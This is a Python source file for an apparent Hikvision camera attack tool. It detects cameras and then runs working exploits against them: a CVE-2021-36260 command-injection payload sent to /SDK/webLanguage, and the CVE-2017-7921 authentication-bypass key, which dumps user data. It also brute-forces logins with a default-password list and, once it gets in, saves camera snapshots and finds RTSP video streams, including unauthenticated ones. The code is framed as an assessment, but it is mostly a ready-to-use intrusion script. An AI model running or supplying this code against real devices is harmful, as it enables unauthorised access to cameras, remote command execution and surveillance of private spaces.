"""
Hikvision Camera Scanner
=========================
Detects Hikvision cameras and runs targeted attacks:
- Firmware version detection (ETag timestamp)
- CVE-2021-36260 unauthenticated RCE check
- CVE-2017-7921 auth bypass check  
- Default credential brute force
- RTSP stream URL discovery
- Snapshot capture
"""

import subprocess
import re
import requests
import hashlib
import time
from datetime import datetime

# Suppress SSL warnings
import urllib3
urllib3.disable_warnings()

HIKVISION_PASSWORDS = [
    "12345", "admin", "admin123", "Admin123", "Admin@123",
    "hik12345", "Hik12345", "12345678", "password", "123456789",
    "admin1234", "Admin1234", "admin@123", "Hikvision", "hikvision",
    "camera", "Camera123", "nvr12345", "Nvr12345", "1234567890",
    "admin12345", "Admin12345", "Hik@12345", "hik@12345",
]

RTSP_PATHS = [
    "/Streaming/Channels/101",
    "/Streaming/Channels/102",
    "/Streaming/Channels/201",
    "/PSIA/Streaming/channels/1",
    "/h264/ch1/main/av_stream",
    "/h264/ch01/main/av_stream",
    "/cam/realmonitor?channel=1&subtype=0",
]


def detect_hikvision(ip, port=80):
    """Detect if device is Hikvision and get firmware info."""
    result = {
        "is_hikvision": False,
        "firmware_date": "",
        "etag": "",
        "realm": "",
        "auth_type": "",
        "model": "",
        "ports": [],
    }
    try:
        r = requests.head(f"http://{ip}:{port}/", timeout=5, verify=False)
        etag = r.headers.get("ETag", "")
        server = r.headers.get("Server", "").lower()

        if "hikvision" in server or "hikvision" in r.text.lower():
            result["is_hikvision"] = True

        # Check ISAPI endpoint
        r2 = requests.get(f"http://{ip}:{port}/ISAPI/System/deviceInfo",
                          timeout=5, verify=False)
        if r2.status_code == 401:
            www_auth = r2.headers.get("WWW-Authenticate", "")
            if "Digest" in www_auth or "Basic" in www_auth:
                result["is_hikvision"] = True
                result["auth_type"] = "Digest" if "Digest" in www_auth else "Basic"
                realm_m = re.search(r'realm="([^"]+)"', www_auth)
                if realm_m:
                    result["realm"] = realm_m.group(1)

        if etag:
            result["etag"] = etag
            try:
                ts = int(etag.strip('"'))
                result["firmware_date"] = datetime.fromtimestamp(ts).strftime("%Y-%m-%d")
            except Exception:
                pass

    except Exception:
        pass
    return result


def check_cve_2021_36260(ip, port=80):
    """Check for CVE-2021-36260 unauthenticated command injection."""
    try:
        payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(id>webLib/x)</language>'
        r = requests.put(
            f"http://{ip}:{port}/SDK/webLanguage",
            data=payload,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=5, verify=False
        )
        if r.status_code == 200:
            time.sleep(1)
            r2 = requests.get(f"http://{ip}:{port}/x", timeout=3, verify=False)
            if "uid=" in r2.text:
                return {"vulnerable": True, "output": r2.text[:100], "cve": "CVE-2021-36260"}
        return {"vulnerable": False, "status_code": r.status_code}
    except Exception as e:
        return {"vulnerable": False, "error": str(e)}


def check_cve_2017_7921(ip, port=80):
    """Check for CVE-2017-7921 authentication bypass."""
    try:
        # Magic auth key
        r = requests.get(
            f"http://{ip}:{port}/Security/users?auth=YWRtaW46MTEK",
            timeout=5, verify=False
        )
        if r.status_code == 200 and ("userName" in r.text or "admin" in r.text):
            return {"vulnerable": True, "data": r.text[:200], "cve": "CVE-2017-7921"}

        # Try ISAPI variant
        r2 = requests.get(
            f"http://{ip}:{port}/ISAPI/Security/users?auth=YWRtaW46MTEK",
            timeout=5, verify=False
        )
        if r2.status_code == 200 and "userName" in r2.text:
            return {"vulnerable": True, "data": r2.text[:200], "cve": "CVE-2017-7921"}

        return {"vulnerable": False}
    except Exception as e:
        return {"vulnerable": False, "error": str(e)}


def brute_force_hikvision(ip, port=80, username="admin", passwords=None):
    """Brute force Hikvision digest auth."""
    if passwords is None:
        passwords = HIKVISION_PASSWORDS

    for pwd in passwords:
        try:
            r = requests.get(
                f"http://{ip}:{port}/ISAPI/System/deviceInfo",
                auth=requests.auth.HTTPDigestAuth(username, pwd),
                timeout=5, verify=False
            )
            if r.status_code == 200:
                return {"found": True, "username": username, "password": pwd, "data": r.text[:500]}
        except Exception:
            pass
        time.sleep(0.2)

    return {"found": False}


def get_device_info(ip, port=80, username="admin", password="12345"):
    """Get device info via ISAPI."""
    try:
        r = requests.get(
            f"http://{ip}:{port}/ISAPI/System/deviceInfo",
            auth=requests.auth.HTTPDigestAuth(username, password),
            timeout=5, verify=False
        )
        if r.status_code == 200:
            info = {}
            for field in ["deviceName", "deviceID", "model", "serialNumber",
                          "macAddress", "firmwareVersion", "firmwareReleasedDate"]:
                m = re.search(f"<{field}>([^<]+)</{field}>", r.text)
                if m:
                    info[field] = m.group(1)
            return info
    except Exception:
        pass
    return {}


def capture_snapshot(ip, port=80, username="admin", password="12345",
                     save_path="/tmp/hik_snapshot.jpg"):
    """Capture a snapshot from the camera."""
    try:
        r = requests.get(
            f"http://{ip}:{port}/ISAPI/Streaming/channels/101/picture",
            auth=requests.auth.HTTPDigestAuth(username, password),
            timeout=10, verify=False, stream=True
        )
        if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
            with open(save_path, "wb") as f:
                f.write(r.content)
            return {"saved": True, "path": save_path, "size": len(r.content)}
    except Exception:
        pass
    return {"saved": False}


def discover_rtsp_streams(ip, username="admin", password="12345"):
    """Discover accessible RTSP streams."""
    streams = []
    for path in RTSP_PATHS:
        url = f"rtsp://{username}:{password}@{ip}:554{path}"
        try:
            result = subprocess.run(
                ["ffprobe", "-v", "quiet", "-print_format", "json",
                 "-show_streams", url],
                capture_output=True, timeout=5
            )
            if result.returncode == 0:
                streams.append({"url": url, "accessible": True})
        except Exception:
            pass
        # Also test without auth
        url_noauth = f"rtsp://{ip}:554{path}"
        try:
            result = subprocess.run(
                ["curl", "-s", "--max-time", "3", "-X", "DESCRIBE", url_noauth],
                capture_output=True, timeout=5
            )
            if result.returncode == 0 and b"RTSP" in result.stdout:
                streams.append({"url": url_noauth, "accessible": True, "auth": False})
        except Exception:
            pass
    return streams


def full_hikvision_scan(ip, port=80):
    """
    Complete Hikvision camera assessment.
    Returns comprehensive findings dict.
    """
    findings = {
        "ip": ip,
        "port": port,
        "is_hikvision": False,
        "firmware_date": "",
        "realm": "",
        "cve_2021_36260": {},
        "cve_2017_7921": {},
        "credentials": {},
        "device_info": {},
        "rtsp_streams": [],
        "risk_level": "LOW",
        "summary": [],
    }

    # Step 1: Detect
    info = detect_hikvision(ip, port)
    findings.update(info)

    if not findings["is_hikvision"]:
        return findings

    # Step 2: CVE checks
    findings["cve_2021_36260"] = check_cve_2021_36260(ip, port)
    findings["cve_2017_7921"] = check_cve_2017_7921(ip, port)

    if findings["cve_2021_36260"].get("vulnerable"):
        findings["risk_level"] = "CRITICAL"
        findings["summary"].append("CVE-2021-36260: Unauthenticated RCE CONFIRMED")

    if findings["cve_2017_7921"].get("vulnerable"):
        findings["risk_level"] = "CRITICAL"
        findings["summary"].append("CVE-2017-7921: Auth bypass CONFIRMED - credentials exposed")

    # Step 3: Brute force
    creds = brute_force_hikvision(ip, port)
    findings["credentials"] = creds
    if creds.get("found"):
        findings["risk_level"] = "CRITICAL"
        findings["summary"].append(
            f"Default credentials: {creds['username']}:{creds['password']}"
        )
        # Step 4: Get device info with found creds
        findings["device_info"] = get_device_info(ip, port, creds["username"], creds["password"])
        # Step 5: Capture snapshot
        snap = capture_snapshot(ip, port, creds["username"], creds["password"])
        if snap.get("saved"):
            findings["summary"].append(f"Snapshot saved: {snap['path']}")

    # Step 6: RTSP streams
    pwd = creds.get("password", "12345") if creds.get("found") else "12345"
    findings["rtsp_streams"] = discover_rtsp_streams(ip, "admin", pwd)

    if not findings["summary"]:
        findings["summary"].append("Camera is patched - no known CVEs exploitable")
        findings["risk_level"] = "MEDIUM"

    return findings
